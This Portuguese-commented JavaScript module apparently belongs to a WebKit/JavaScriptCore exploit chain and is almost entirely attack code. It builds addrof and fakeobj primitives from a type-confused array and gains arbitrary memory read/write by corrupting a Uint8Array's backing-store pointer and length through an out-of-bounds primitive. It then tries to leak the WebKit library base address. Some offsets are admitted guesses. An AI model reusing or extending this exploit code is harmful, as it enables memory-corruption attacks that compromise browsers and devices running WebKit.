// js/script3/testArrayBufferVictimCrash.mjs (v133 - R93 Importar getOOBAllocationSize)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Corrigido ReferenceError para getOOBAllocationSize, importando-o de core_exploit.mjs.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute, 
    oob_write_absolute,
    getOOBAllocationSize // NOVO: Importado getOOBAllocationSize
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v133_R93_ImportOOBSize";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Corrupção de Backing Store SEM Addrof na Fase 5 ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    // Primitivas de addrof/fakeobj (usadas APENAS na Fase 4, NÃO na Fase 5)
    let confused_array;
    let victim_array;
    let addrof_func;
    let fakeobj_func; 

    // A primitiva arbitrária real será baseada no Uint8Array corruptível
    let arb_rw_array = null; 

    // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
    let arb_read_stable = null;
    let arb_write_stable = null;

    // Definir a constante localmente, já que não pode ser importada de core_exploit
    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 

    try {
        // Helper para definir as primitivas addrof/fakeobj (usadas APENAS na Fase 4)
        const setupAddrofFakeobj = () => {
            confused_array = [13.37]; 
            victim_array = [{ dummy: 0 }]; 
            
            addrof_func = (obj) => {
                victim_array[0] = obj;
                return doubleToInt64(confused_array[0]);
            };
            fakeobj_func = (addr) => { 
                confused_array[0] = int64ToDouble(addr);
                return victim_array[0];
            };
        };


        // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        setupAddrofFakeobj(); 
        
        let leaker_phase4 = { obj_prop: null, val_prop: 0 };
        const arb_read_phase4 = (addr, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            const result_64 = doubleToInt64(leaker_phase4.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };
        const arb_write_phase4 = (addr, value, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            if (size_bytes === 4) {
                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; 
            } else {
                leaker_phase4.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");

        // --- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray_phase4 = [];
        for (let i = 0; i < 1000; i++) {
            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
        }
        const test_obj_phase4 = spray_phase4[500]; 
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr_phase4 = addrof_func(test_obj_phase4);
        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr_phase4 = test_obj_addr_phase4.add(0x10); 

        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço ${prop_a_addr_phase4.toString(true)}...`, "info");
        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4);

        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4);
        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");

        if (!value_read_phase4.equals(value_to_write_phase4)) {
            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
        }
        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(50); 

        // ============================================================================
        // INÍCIO FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL SEM addrof_func
        // ============================================================================
        logS3("--- FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (SEM addrof_func) ---", "subtest");
        
        // Zera as referências das primitivas addrof/fakeobj da Fase 4 para evitar contaminação.
        confused_array = null;
        victim_array = null;
        addrof_func = null; // Garante que não será usada.
        fakeobj_func = null; // Garante que não será usada.
        leaker_phase4 = null; 
        
        // Criar o arb_rw_array. Ele será alocado no heap.
        arb_rw_array = new Uint8Array(0x1000); 
        logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");

        // ATENÇÃO: ESTE É O PONTO CRÍTICO. PRECISAMOS ACHAR O ENDEREÇO DO ARB_RW_ARRAY SEM ADDROF.
        // ASSUMIR UMA LOCALIZAÇÃO RELATIVA:
        // Isso é altamente dependente do alocador de heap e é especulativo.
        // Para testes, vamos assumir que ele está em um offset fixo conhecido do oob_array_buffer_real.
        const ARB_RW_ARRAY_BASE_OFFSET_IN_OOB_BUFFER = 0x800; // <<<< ESTE VALOR É UM CHUTE. PRECISA SER VALIDADO.
                                                             // Sugere que arb_rw_array é alocado a ~2KB do início do OOB.
                                                             // Ou é o offset da sua ArrayBufferView dentro do OOB.

        const arb_rw_array_ab_view_addr_in_oob_buffer = ARB_RW_ARRAY_BASE_OFFSET_IN_OOB_BUFFER;

        // Validar que o offset do ArrayBufferView é razoável (deve estar dentro do oob_array_buffer_real)
        if (arb_rw_array_ab_view_addr_in_oob_buffer < OOB_DV_METADATA_BASE_IN_OOB_BUFFER || 
            arb_rw_array_ab_view_addr_in_oob_buffer >= getOOBAllocationSize()) { // getOOBAllocationSize está agora importado
            throw new Error(`FALHA CRÍTICA: Offset assumido para arb_rw_array_ab_view_addr_in_oob_buffer (${toHex(arb_rw_array_ab_view_addr_in_oob_buffer)}) é irrealista para o oob_array_buffer_real (tamanho total ${getOOBAllocationSize()}).`);
        }
        logS3(`    Assumindo que ArrayBufferView de arb_rw_array está em offset ${toHex(arb_rw_array_ab_view_addr_in_oob_buffer)} no oob_array_buffer_real.`, "warn");

        const arb_rw_array_m_vector_orig_ptr_in_oob = arb_rw_array_ab_view_addr_in_oob_buffer + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const arb_rw_array_m_length_orig_ptr_in_oob = arb_rw_array_ab_view_addr_in_oob_buffer + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
        
        const original_m_vector = oob_read_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, 8);
        const original_m_length = oob_read_absolute(arb_rw_array_m_length_orig_ptr_in_oob, 4);

        logS3(`    Original m_vector de arb_rw_array (lido via OOB): ${original_m_vector.toString(true)}`, "info");
        logS3(`    Original m_length de arb_rw_array (lido via OOB): ${toHex(original_m_length)}`, "info");

        // Precisamos verificar se original_m_vector E original_m_length parecem válidos
        // antes de prosseguir. Um m_vector deve ser um ponteiro para o heap JS (não zero, 0x7FFF...).
        if (original_m_vector.equals(AdvancedInt64.Zero) || (original_m_vector.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: m_vector lido do arb_rw_array (${original_m_vector.toString(true)}) é inválido. O offset assumido para arb_rw_array pode estar incorreto.`);
        }
        if (original_m_length === 0) { 
             logS3(`    ALERTA: m_length de arb_rw_array é zero. Isso é inesperado para um ArrayBuffer alocado.`, "warn");
             throw new Error(`FALHA CRÍTICA: m_length de arb_rw_array é zero. Isso indica que o offset assumido está incorreto, ou o ArrayBuffer não foi alocado corretamente.`);
        }


        arb_read_stable = (address, size_bytes) => {
            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, address, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_in_oob, 0xFFFFFFFF, 4); 

            let result;
            const dv = new DataView(arb_rw_array.buffer); 
            if (size_bytes === 1) result = arb_rw_array[0]; 
            else if (size_bytes === 2) result = dv.getUint16(0, true);
            else if (size_bytes === 4) result = dv.getUint32(0, true);
            else if (size_bytes === 8) result = doubleToInt64(dv.getFloat64(0, true));
            else throw new Error("Tamanho de leitura inválido para arb_read_stable.");

            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, original_m_vector, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_in_oob, original_m_length, 4);
            return result;
        };

        arb_write_stable = (address, value, size_bytes) => {
            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, address, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_in_oob, 0xFFFFFFFF, 4); 

            const dv = new DataView(arb_rw_array.buffer); 
            if (size_bytes === 1) arb_rw_array[0] = value;
            else if (size_bytes === 2) dv.setUint16(0, value, true);
            else if (size_bytes === 4) dv.setUint32(0, value, true);
            else if (size_bytes === 8) dv.setFloat64(0, int64ToDouble(value), true);
            else throw new Error("Tamanho de escrita inválido para arb_write_stable.");

            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, original_m_vector, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_in_oob, original_m_length, 4);
        };
        logS3("Primitivas de L/E estáveis (arb_read_stable, arb_write_stable) construídas com sucesso.", "good");
        await PAUSE_S3(50);


        // ============================================================================
        // FASE FINAL: VAZAR BASE WEBKIT LENDO DE SÍMBOLO GLOBAL CONHECIDO (USANDO arb_read_stable)
        // ============================================================================
        logS3("--- FASE 6: VAZAMENTO DE WEBKIT BASE LENDO DE SÍMBOLO GLOBAL CONHECIDO (com arb_read_stable) ---", "subtest");
        
        const assumed_webkit_base = new AdvancedInt64(WEBKIT_LIBRARY_INFO.JSC_OFFSETS.ASSUMED_WEBKIT_BASE_FOR_TEST); // Corrigir JSC_OFFSETS aqui para WEBKIT_LIBRARY_INFO
        logS3(`[ASSUNÇÃO] Usando base da WebKit assumida para teste: ${assumed_webkit_base.toString(true)}`, "warn");

        const s_info_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"]);
        const s_info_address = assumed_webkit_base.add(s_info_offset);
        logS3(`[Etapa 1] Endereço de JSC::JSArrayBufferView::s_info (assumido): ${s_info_address.toString(true)}`, "info");

        const s_info_val = arb_read_stable(s_info_address, 8); 
        logS3(`[Etapa 2] Valor lido de JSC::JSArrayBufferView::s_info: ${s_info_val.toString(true)}`, "leak");

        if (s_info_val.equals(AdvancedInt64.Zero) || (s_info_val.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: Leitura de JSC::JSArrayBufferView::s_info retornou um valor inválido (${s_info_val.toString(true)}). A base assumida ou o offset estão incorretos, ou a primitiva de L/E não pode ler fora do heap JS.`);
        }
        logS3(`[Etapa 2] Leitura de s_info bem-sucedida! Isso confirma que a primitiva de L/E pode ler em endereços arbitrários.`, "good");

        const webkit_base_addr = s_info_val.sub(s_info_offset); 
        final_result.webkit_base_addr = webkit_base_addr.toString(true);

        if (webkit_base_addr.equals(AdvancedInt64.Zero) || (webkit_base_addr.high() >>> 16) !== 0x7FFF) {
             throw new Error(`FALHA CRÍTICA: Endereço Base da WebKit calculado (${webkit_base_addr.toString(true)}) é inválido ou não é um ponteiro de userland.`);
        }

        logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
        logS3(`   ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");

        final_result.success = true;
        final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        confused_array = null;
        victim_array = null;
        addrof_func = null;
        fakeobj_func = null;
        arb_rw_array = null; 
        arb_read_stable = null;
        arb_write_stable = null;
        
        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Fixed WebKit Leak Attempt)' }
    };
}
